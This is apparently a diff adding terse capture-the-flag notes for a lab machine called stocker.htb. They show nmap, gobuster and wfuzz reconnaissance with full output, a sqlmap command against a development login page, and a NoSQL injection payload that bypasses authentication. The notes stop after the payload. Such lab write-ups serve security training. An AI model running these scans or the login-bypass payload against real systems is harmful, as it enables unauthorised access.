@@ -1,0 +1,78 @@
+We run nmap:
+
+nmap -p- 10.10.11.196
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-29 19:34 EET
+Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 53.43% done; ETC: 19:35 (0:00:20 remaining)
+Nmap scan report for 10.10.11.196
+Host is up (0.060s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+nmap -sC -sV -p22,80 10.10.11.196
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-29 19:35 EET
+Nmap scan report for 10.10.11.196
+Host is up (0.059s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
+|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
+|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://stocker.htb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.86 seconds
+
+gobuster dir -u http://stocker.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt 
+===============================================================
+Gobuster v3.3
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://stocker.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.3
+[+] Timeout:                 10s
+===============================================================
+2023/01/29 19:43:44 Starting gobuster in directory enumeration mode
+===============================================================
+/css                  (Status: 301) [Size: 178] [--> http://stocker.htb/css/]
+/favicon.ico          (Status: 200) [Size: 1150]
+/fonts                (Status: 301) [Size: 178] [--> http://stocker.htb/fonts/]
+/img                  (Status: 301) [Size: 178] [--> http://stocker.htb/img/]
+/index.html           (Status: 200) [Size: 15463]
+/js                   (Status: 301) [Size: 178] [--> http://stocker.htb/js/]
+
+
+wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://stocker.htb/" -H "Host: FUZZ.stocker.htb" --hc 301
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://stocker.htb/
+Total requests: 19966
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                           
+=====================================================================
+
+000000019:   302        0 L      4 W        28 Ch       "dev"  
+
+
+sqlmap -u "http://dev.stocker.htb/login?error=auth-required" 
+
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
+
+
+{"username": {"$ne": null}, "password": {"$ne": null}}
